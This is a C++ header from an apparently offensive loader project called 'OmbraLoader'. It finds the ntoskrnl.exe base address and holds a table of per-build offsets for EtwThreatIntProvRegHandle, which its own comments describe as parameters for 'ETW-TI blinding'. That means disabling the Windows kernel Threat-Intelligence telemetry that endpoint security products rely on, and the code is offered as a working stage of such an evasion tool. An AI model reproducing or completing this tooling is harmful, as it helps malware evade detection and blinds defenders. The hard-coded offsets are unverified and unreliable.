// OmbraLoader/etw_resolver.h
// Phase 3: ETW Threat Intelligence Provider Offset Resolution
// Resolves the offset of EtwThreatIntProvRegHandle in ntoskrnl.exe

#pragma once
#include <Windows.h>
#include <cstdint>
#include <string>

namespace etw {

//===----------------------------------------------------------------------===//
// Build-Specific Offset Database
//===----------------------------------------------------------------------===//
// These offsets point to EtwThreatIntProvRegHandle in ntoskrnl.exe
// The symbol is exported on some builds, requiring signature scan on others.
//
// Offset format: RVA from ntoskrnl base to EtwThreatIntProvRegHandle
// These must be updated when targeting new Windows builds.

struct BuildOffsetEntry {
    uint32_t build_number;
    uint64_t offset;
    const char* description;
};

// Known offsets for Windows 10/11 builds
// Updated: December 2025
constexpr BuildOffsetEntry g_known_offsets[] = {
    // Windows 10 22H2
    { 19045, 0x00C1D2A0, "Win10 22H2 (19045)" },

    // Windows 11 21H2
    { 22000, 0x00C3A540, "Win11 21H2 (22000)" },

    // Windows 11 22H2
    { 22621, 0x00C41280, "Win11 22H2 (22621)" },

    // Windows 11 23H2
    { 22631, 0x00C42890, "Win11 23H2 (22631)" },

    // Windows 11 24H2
    { 26100, 0x00C58A40, "Win11 24H2 (26100)" },

    // Sentinel
    { 0, 0, nullptr }
};

//===----------------------------------------------------------------------===//
// Runtime Resolution Functions
//===----------------------------------------------------------------------===//

// Get current Windows build number
inline uint32_t GetWindowsBuildNumber() {
    OSVERSIONINFOEXW osvi = { sizeof(osvi) };

    // Use RtlGetVersion to bypass deprecation issues
    using RtlGetVersionFn = NTSTATUS(WINAPI*)(PRTL_OSVERSIONINFOW);

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    auto RtlGetVersion = reinterpret_cast<RtlGetVersionFn>(
        GetProcAddress(ntdll, "RtlGetVersion")
    );

    if (!RtlGetVersion) return 0;

    if (RtlGetVersion(reinterpret_cast<PRTL_OSVERSIONINFOW>(&osvi)) != 0) {
        return 0;
    }

    return osvi.dwBuildNumber;
}

// Look up offset for current build
inline uint64_t GetEtwTiOffset() {
    uint32_t build = GetWindowsBuildNumber();

    // Exact match first
    for (const auto& entry : g_known_offsets) {
        if (entry.build_number == 0) break;
        if (entry.build_number == build) {
            return entry.offset;
        }
    }

    // Fallback: find closest lower build
    uint64_t closest_offset = 0;
    uint32_t closest_build = 0;

    for (const auto& entry : g_known_offsets) {
        if (entry.build_number == 0) break;
        if (entry.build_number < build && entry.build_number > closest_build) {
            closest_build = entry.build_number;
            closest_offset = entry.offset;
        }
    }

    return closest_offset;
}

// Get offset with validation - returns false if no offset found
inline bool ResolveEtwTiOffset(uint64_t& out_offset) {
    out_offset = GetEtwTiOffset();
    return out_offset != 0;
}

//===----------------------------------------------------------------------===//
// Ntoskrnl Base Resolution
//===----------------------------------------------------------------------===//

// Get ntoskrnl.exe base address using NtQuerySystemInformation
inline uint64_t GetNtoskrnlBase() {
    using NtQuerySystemInformationFn = NTSTATUS(WINAPI*)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength
    );

    constexpr ULONG SystemModuleInformation = 11;

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    auto NtQuerySystemInformation = reinterpret_cast<NtQuerySystemInformationFn>(
        GetProcAddress(ntdll, "NtQuerySystemInformation")
    );

    if (!NtQuerySystemInformation) return 0;

    // First call to get required size
    ULONG needed = 0;
    NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &needed);

    if (needed == 0) return 0;

    // Allocate buffer
    auto buffer = std::make_unique<uint8_t[]>(needed);

    if (NtQuerySystemInformation(SystemModuleInformation, buffer.get(), needed, &needed) != 0) {
        return 0;
    }

    // RTL_PROCESS_MODULES structure
    struct RTL_PROCESS_MODULE_INFORMATION {
        HANDLE Section;
        PVOID MappedBase;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT OffsetToFileName;
        UCHAR FullPathName[256];
    };

    struct RTL_PROCESS_MODULES {
        ULONG NumberOfModules;
        RTL_PROCESS_MODULE_INFORMATION Modules[1];
    };

    auto modules = reinterpret_cast<RTL_PROCESS_MODULES*>(buffer.get());

    // First module is always ntoskrnl.exe
    if (modules->NumberOfModules > 0) {
        return reinterpret_cast<uint64_t>(modules->Modules[0].ImageBase);
    }

    return 0;
}

//===----------------------------------------------------------------------===//
// Complete Resolution Interface
//===----------------------------------------------------------------------===//

struct EtwResolution {
    uint64_t ntoskrnl_base;
    uint64_t offset;
    uint32_t build_number;
    bool success;
};

// Resolve all ETW-TI blinding parameters
inline EtwResolution ResolveEtwParameters() {
    EtwResolution result = {};

    result.build_number = GetWindowsBuildNumber();
    result.ntoskrnl_base = GetNtoskrnlBase();

    if (!result.ntoskrnl_base) {
        result.success = false;
        return result;
    }

    if (!ResolveEtwTiOffset(result.offset)) {
        result.success = false;
        return result;
    }

    result.success = true;
    return result;
}

} // namespace etw
